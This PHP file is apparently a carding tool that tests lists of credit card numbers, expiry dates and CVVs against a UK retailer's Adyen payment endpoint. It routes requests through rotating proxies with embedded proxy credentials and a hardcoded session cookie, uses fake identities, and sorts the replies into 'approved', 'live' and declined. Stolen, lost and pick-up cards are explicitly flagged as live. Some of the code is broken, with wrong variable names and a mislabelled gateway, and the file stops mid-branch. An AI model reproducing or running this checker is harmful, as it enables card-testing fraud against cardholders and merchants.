<?php

#---------------------------------------------------------------------------------------------------------------------------------#
#---------------------------------------------------[MADE BY 𝑫𝑹𝑨𝑮𝑶𝑵#𝑴𝑨𝑺𝑻𝑬𝑹]----------------------------------------------------#
#---------------------------------------------------------------------------------------------------------------------------------#
 

require 'function.php';

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\:\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
/////////////////////==============[Init Proxy Section]===============//////////////////////////////
///////////////////////////===[Webshare proxys for cc checker]===////////////////////////////////////
$Websharegay = rand(0,250);
$rp1 = array(
  1 => 'allhxpvu-rotate:xksjbgb5y21k',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead![".$rotate."] ❌";
}
echo '[ IP: '.$ip.' ] ';
///////////////////////==============[End Proxy Section]===============//////////////////////////////#-------------------
////////////////////////////===[1ST CURL]
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.ghost.co.uk/Adyen/ProcessPayment');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.ghost.co.uk',
'method: POST',
'path: /Adyen/ProcessPayment',
'scheme: https',
'accept: application/json, text/plain, */*',
'accept-language: en-US,en;q=0.5',
'content-type: application/json',
'Cookie: HCSESSION=SessionId=EB6427F04BA992AF168018EA88232A3012C92D7006EAAA21FD00009CE4DD532D3B4EA0D067BB09B63C9028501F4DA17156BDA92FFA7842171CA263D37DF281564D9A21B1682B505B3AFC235D74B8C3E95933BC01; ARRAffinity=e9fc8a5326e4c8345eedfc2ddfd3ebcf03a716ed8a09dd7414b6db49b0b058bb; ARRAffinitySameSite=e9fc8a5326e4c8345eedfc2ddfd3ebcf03a716ed8a09dd7414b6db49b0b058bb; __RequestVerificationToken=4YBn51CE7fONRKpFOT_LohCtzVom378ErbwFYJ21T1G5j_Mn2WxtpvOxLzkfviqsC3WtdAkENWKhYtAMWRIR_NDE2Gg1; _clck=15vurj|1|ezw|0; OptanonConsent=…isitor=%22561CE87DEFBC3790%22; glselect=; geolocation=1; RecentlyViewed=5442; scarab.mayAdd=%5B%7B%22i%22%3A%22V02G015-F19%22%7D%5D; scarab.profile=%22V02G015-F19%7C1647683785%22; .ASPXAUTH=6728B5D74550B6F3C89D324A64A096F1B2A9992F4083F8C1CCB50A691D16B7562D110C437527E03393519086FAE42C878153EFCF91BD24A5075A7ED16E8E26750CCBACA737298D5C1C2DB2011151712D00505CBD; language=en_GB; amazon-pay-connectedAuth=connectedAuth_general; apay-session-set=Le48UMBTZbbag5gNnkwMHaJZXuePH24aEYztzsEwP%2F2rmjw198xBgtYrypo%2FPXE%3D',
'origin: https://www.ghost.co.uk',
'referer: https://www.ghost.co.uk/checkout/payment',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, '{"paymentMethodDetails":{"Type":"scheme","HolderName":"'.$name.'+'.$last.'","EncryptedCardNumber":"adyenjs_0_1_25$SIcPtyrx7c8CdnSmFLLtSbFPkHEsPi5dkhH2pUg0T2IsTcyegv0Kyp/5b7fV25wZB8qHgxjH7CnNZxITlqaf5wGWlZjU+C5VLUknK9uLyKo2CAmyZgFuAQDSezZfCOxvbSUJ6MW9ErJhfTFKJrrbxAQVLn+tgArSO77vEvb+RxhNqIuNe7kUdMyEeEqD0wbZq2+nGbGToPjEvsy86zjtTQlTdLQknvnDeXz0t12gx7+yfJZ0aGT9sowgB69SEpiXyWZUTu98KZ5L7mPqx+/+jeJDS3/B3kclNDhssNV7Bz+fgptJzjX0YNSZ4REfvnvjc7wGwc0e+qT5TknI5QIzdg==$ZaBFPiVBzAIunx6fT0HvCJBjnBgPwbOh2oGQHWv167ww+fS+llWv0vB61LviUo8nuNGqq+XQcS2ujo+ODI7btIB2o8wp/+pI1wqDXeKwbLcg/h5CSnJBj1TX2FOiIE+FQqkKI0a/IUzD2DqcmISx0qiyaPQ0V3jH+skaXqbQh2i8F0rJ4g6ntPDFWViFilo9DRZxpBQ8b12CcEhzuqpKKt29n/ZiQ0B3sqWdotKBOiRP7Yz5ARpX7CzVpknJTFxT4sPzPegS36bKsTPnUoO3ZLKmiVQy4xKhzbJ3p8nZrpKcicwPwLMSRPmaNjljb7bBAzMcP/m9nmYFfCNlu+j+5n/8a7aOyehXuIkCq/0kcquhGQaaR9I7PO76hCd3TUDWS6Aq2FSgqV42HB3Q96xe3hXA2ypu/L4Mw9P+e/VrC4br6KOF4GcAiP7rnJHroHUSM1D7pXAh6FtgKIgNhgDMA8Q8dmVKUTo1P/k6m7ChOx0JsGa/ZdKz770zG6VWkKZQfWBtGnfWHlVwdYi3EYFJPUhp0jEJ3P+xTHTdp3DnsfDrKNpYjsBUvseNBvdpXmQYixH0SoEkUvCzsDjC9y/4wXpNmgTIFy4lqxlev2lLt3blZ5xQiVHCcl1Yl+uNvK37o0Mt2a7KhqF083CYocBnCgS4WzfVCR9rAXrdaxmbabdIuDj7Hpn+22xi3KtQeStmDyw04+vGEfY9/1eg4G+4A4Aph8xo7BynDdvmKNCBXonElCyZOEmL1UDjOfO87txVf/pr1EMVPHA6Vi2SvFJ0PLwYBBjLlcMgD4dekpCe3vSUyiNgaI0umsGQuw==","EncryptedExpiryMonth":"adyenjs_0_1_25$dTQVPqKENOm9hx9z2MEOSUtitLIoWZYSD5ntfEYWO3QAGUa7Aua8kgqWuWJYD5ZNg7bVPC5fZhVoc5Q4bwi1hKJW2YuLv7yGJlicQvekS39ZKjxlrrnOiGZZ5KVRXu9glBjG8+qBx97qPGWaSMama6ORWHHLYiR1kYPdpOI0F5gsc5yUSRhWo+MyoEVbfZx/Dx+y/RuD7/2Uh8aElVHItLVYiTDRMpcJsYK4A/ovKPy6kCvlMourNw4W34N0CXxIEXwF1wUuUmWhuDnMC8GgFsW2Zna49RCCZaK36uFORx+cM5vaSWdn9sHUEv+UabJ1R2aeaHzhVumbDbrf/mtcQQ==$EHbB0NS0wDWyiSodWV5/Op7bVd2K4tgy14FAnKN6XbJAoZuJaQVWbE8PzGSyar/i1JgvaEM5KcP6MR6SuN9JoHBQzHr2tLWiegHFHcdBBAIl7Y0QYanZayEzuyUmt8H69nGA1LVBKgxoFk75mv/2xsaiXTEbsiiZKqTlItRvHC8zrUrX88Yv2rTLFAECNUwcPwwvX+2fcOyAQgB0Wz06nPTFL0wmNa2fsoragRMQuK1AkJA+q3IouIOdxB0awLpODdzo0jyq7bwZEiDT05fekNf7SVfqAvbuouU7GhlvaWtnd9ldaOZVItugkTVR5fFug0mxNdLgbQYiCnxGvZpLFTGY8LjO2nbnqhjAbCKQzF1URsKNQgR18Ua2EDO0Zxio4zxqGISv9OQLBWrmdxlOdWJfssLSDaH8UReN3asifBM2HbXbKlYIYAZwV0HBwPH+C6zIZ5tLMGaeu/RgbEn6bHEU1UX8eg7FaYK2ztxzhhxSmvfaHlvrdeznQGuxgFgZzgc9CiQ=","EncryptedExpiryYear":"adyenjs_0_1_25$T6ilhREDFc5xViOlvxEZi6HCtgI9PP1Tk5Iq93Xk05C4mZQddl4u4vQWM30ZGodHC4Ct+zSDyoUetJGw+VgnQX8tKwepJAey9IqIVenzgRpBBni9KtKlinkOrjs/Y5nmhXE+8uaNV4aZVWy/tkKNeuln8br3qUNArlxOk8n5JxTdTx7Pm7dsQODs5dRCSZNdjsuhmSkeppFelgl/zDMGInCprJ5NiTQ3mjn7pfibo8FoJGjeskeO+uWxa5flDMzuDp9Jl+Xp/TPpvuyEGta0Jz4ctRxONO6sxgB8Oi0yVoUg6dxFEl7Ku1fOvKBUYSVOy0bXQHWYjH4E2VaC0OYuhQ==$zPWUIF69YPTBYXqtXYl0D9dDzLTb0O1L688WLZ08lzjdbqQ7aiZnSUsnQ4D/iwgjJudR+OD/Y/qDpTwgkwIcqFLpBwM04grvjNLoNgew5AjlQNUO6jGMp2xQ5m4lOo+kd+o1e3JCVpr9I1cAs3wG3rQ0G9oS/zMJ+lVc0/aQg4qg7FPZDBSW56d7IKOitY2KNlblkh/gwj2YynrRLQUr13nPdJLOO9UbxUwUaPCmjFOyNfMtAsU86V4WgeyGconcjrqZCVh2PqDUp0sXAvgNwT91IE+v/Ftvag8nuZkfMv42gWZTmK5TzhzvjwRR1rXoSxREgD9P4aIECsIeCtbtEDoWHbrHDM52twOb5T87xy/emSc6N1v/Ptad3ICu4CYP4TkswrxKslB/b5jNt/gwQnBSk2yCXUafjnEXB3BH0oIUD2W9BJRtQlr/7ZoXoIFPs25AOHQo43mxQkjePJBHH/I5gXMoE2hlMDDVC4t2ufcrhfCya1qg01MFvE2hjovAP1foXVLm","EncryptedSecurityCode":"adyenjs_0_1_25$B5IcSbM/NlCQS+pJLIFbZGcQJpmLV3ABl9BCCdSzFgG5SmQEdbbGMGYKtuyw24YEwCWBI+LblXNQi/8YJrX0lN1hiJ+gOR6TR17u6D0dTY26xRhlfG08XANft13dB7hQUmJ+sBSdo3nsNikzQL3Lzj9tEQ6b8KlTBxOIPGqh8jQ7hsmb8OXZpvH+1hu/ClSRi5FxzZE0zat1rcHeMkVrxQMcaMOAgCrzgvowhT85qBr3mN/A0L3McJF4fD8r1KjzWR9iLOYnX6lQHczbayXEag7qn0iP2blP0JNx/i+BTbU7dWuHsNd161fD9hEZOGxpkLz3wXwga7KqfnDX7P9niQ==$oAFOtvzLD8jteHF3a2n+O8BBOdhrPIxeJhMh9RPS2Fg6lhGop+p2Vt0n9bDv13d7FHdkAzBH/zXkn1Uz2nEj2Q/f9Ze+u4pzBgl+EXFuYSIjRcPi8bUATxAlOHeLZD59dKzpFvESot4Hf2jJB8zoMJCIwO9uBtnsOxxdOddKpf4ASxEx16JgH7rRyO0MXtrOd/M06o3zoovL0LrybeOyw3OmJU6aNgX3ZRJvUGS3wEzJKOuE+xFm56C7lr/fEbMx2Sm7+ge+pilzR5GwvgXIcTcFwhupD1PX3McTfdxlBkzjxFqbfC3h0XwOnsufk7YLJ/RlNwweca6iHDwEdYRr9PgTZrolptuvxBjJV4VEkm6aYN3XQf9DRS9OfwI8vhCKyOoYzuqe2CEktvrQhk8QzVueIIVzrNVHwel9NotWnYxksjNSpM6wUumzr6oDV3l9unx0iBcg0NgM7pO/IXyVlVaPgw2KuUdAO4Fo7tV+tEFBN+RxIvKZd+NAzrTRog==","BrowserInfoJson":"{\"acceptHeader\":\"*/*\",\"colorDepth\":24,\"language\":\"en-US\",\"javaEnabled\":false,\"screenHeight\":720,\"screenWidth\":1280,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0\",\"timeZoneOffset\":0}"},"isGift":false}');


$result1= curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];

// this is for additional info - so result will look more good by adding the info of the bin

/////////// [Bin Lookup] /////////////

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/'.$bin.'/');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$brand = $binna['scheme'];
$country = $binna['country']['name'];
$type = $binna['type'];
$bank = $binna['bank']['name'];
curl_close($ch);



# ----------------------------------------------------------- [Responses] ------------------------------------------------------- #



# ------------------------------------------------- [CVV Responses ] ------------------------------------------------------------ #

if
(strpos($result1,  '"cvc_check": "pass"')) {
  echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">{MSG:- CVC MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  "Thank You For Donation.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  '"Thank You For Pyment."')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  "Thank You.")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  '(24) - Refused CVC Declined')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Your Card Zip Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  '/donations/thank_you?donation_number=','')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Thank You For Donation. }</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

elseif
(strpos($result1,  "Refused Not enough balance")) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCV MATCHED {MSG:- Incorrect Zip}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 


elseif
(strpos($result1,  '"type":"(12) - Refused Not enough balance"')) {
    echo '</br><span class="badge badge-success">👑 APPROVED! 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">{MSG:- CCV MATCHED}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
} 

# -------------------------------------------------- [CVV Responses END ] ------------------------------------------------------ #



# ----------------------------------------------------- [CCN Responses ] ------------------------------------------------------ #

elseif
(strpos($result1,  'security code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  'Your card&#039;s security code is incorrect.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Your Card&#039;s Security Code Is Incorrect.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  }

elseif
(strpos($result1,  'incorrect_cvc')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">CCN LIVE {MSG:- Incorrect CVC.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

#----------------------------------------------------- [CCN Responses END ]------------------------------------------------------ #



#--------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses]--------------------------------------------------- #

elseif
(strpos($result1,  "stolen_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Stolen Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  "lost_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Lost Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  'Your card has insufficient funds.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Your Card Has Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  "pickup_card")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Pickup Card.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  "(12) - Refused Not enough balance")) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Insufficient Funds.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  '"cvc_check": "fail"')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- CVC FAILED.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

elseif
(strpos($result1,  'security code is invalid.')) {
    echo '</br><span class="badge badge-success">👑 Aprovada 👑</span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> |  <span class="badge badge-warning">LIVE {MSG:- Security Code Is Invalid.}</span> |   <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
}

# -------------------------------------------------- [Stolen,Lost,Pickup,Insufficient Funds Responses END ] --------------------- #



# --------------------------------------------------- [Reprovada,Decline Responses ] -------------------------------------------- #

elseif
(strpos($result1,  'Your card has expired.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Expired Card</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  'Your card number is incorrect.')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "incorrect_number")) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Your Card Number Is Incorrect.</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  '(20) - Refused Payment declined, please contact customer services ')) {
    echo '</br><span class="badge badge-danger">☠️ Reprovada ☠️ </span> : <span class="badge badge-primary"> ' . $lista . ' </span> | <span class="badge badge-success">STRIPE-1REQ</span> | <span class="badge badge-warning">Reason: Card Was Declined</span> |  <span class="badge badge-info">[ Card Type:- ' . $type . ' | Level:- ' . $brand . ' | Bank:- ' . $bank . ' ] </span>   <span class="badge badge-dark">[Country:- ' . $country . ' | Bin:- ' . $bin . ' | Time: '.$time.' s   ] </span>| <span class="badge badge-success"> 👑 @ANONBD 👑 </span></br>';
  } 

elseif
(strpos($result1,  "generic_decline")) {
